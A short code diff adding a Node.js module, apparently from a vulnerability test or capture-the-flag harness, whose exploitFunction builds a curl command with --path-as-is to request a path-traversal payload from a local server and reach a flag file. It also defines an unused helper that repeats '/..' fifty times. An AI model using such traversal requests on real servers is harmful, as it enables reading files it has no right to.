@@ -1,0 +1,13 @@
+function exploitFunction(payload) {
+    const path = require("path");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+    const genstr = () => "/..".repeat(50) + pathToFlag;
+
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+    return {
+        attack_string
+    };
+}
+
+module.exports = { exploitFunction };
